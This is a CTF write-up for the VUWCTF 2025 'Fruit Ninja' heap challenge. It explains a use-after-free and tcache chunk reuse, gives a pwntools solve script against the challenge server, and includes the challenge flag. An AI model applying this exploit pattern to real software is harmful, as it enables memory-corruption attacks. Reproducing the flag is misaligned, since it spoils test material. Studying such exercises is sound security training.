---
ctf: VUWCTF 2025
category: pwn
difficulty: easy
points: 100
flag: "VuwCTF{fr33_th3_h34p_sl1c3_th3_fr00t}"
techniques: [heap, use-after-free, tcache]
tools: [pwntools]
---

# Fruit Ninja

## Description
A heap exploitation challenge featuring a fruit-slicing game with a Use-After-Free vulnerability.

## Vulnerability
Use-After-Free in `throw_away_fruit()`: after freeing a fruit chunk, the pointer in `fruit_basket[index]` is not nulled out, leaving a dangling pointer accessible via `edit_fruit()`.

**Win Condition**: `perform_special_action()` reads the flag if `strcmp(leaderboard, "Admin") == 0`.

## Solution

### Exploitation Steps

Both fruits and the leaderboard are allocated as 0x24-byte chunks, so they share the same tcache bin.

1. **Slice a fruit** → `fruit_basket[0] = chunk_A`
2. **Throw away fruit 0** → `chunk_A` goes to tcache, but `fruit_basket[0]` still points to it
3. **Reset leaderboard** → malloc returns `chunk_A` for the new leaderboard
4. **Edit fruit 0 with "Admin"** → UAF writes to leaderboard (same chunk)
5. **Special action** → flag

### Solve Script

```python
from pwn import *

io = remote("fruit-ninja.challenges.2025.vuwctf.com", 9978)

io.sendlineafter(b"Choice: ", b"1")      # slice fruit
io.sendlineafter(b"chars): ", b"AAAA")
io.sendlineafter(b"fruit: ", b"100")

io.sendlineafter(b"Choice: ", b"2")      # throw away (free, no NULL)
io.sendlineafter(b"): ", b"0")

io.sendlineafter(b"Choice: ", b"6")      # reset leaderboard (reuses chunk)

io.sendlineafter(b"Choice: ", b"4")      # edit fruit 0 (UAF → writes to leaderboard)
io.sendlineafter(b"): ", b"0")
io.sendlineafter(b"chars): ", b"Admin")

io.sendlineafter(b"Choice: ", b"5")      # trigger win
io.interactive()
```

## Key Techniques
- Use-After-Free exploitation
- Tcache bin manipulation
- Heap aliasing via UAF
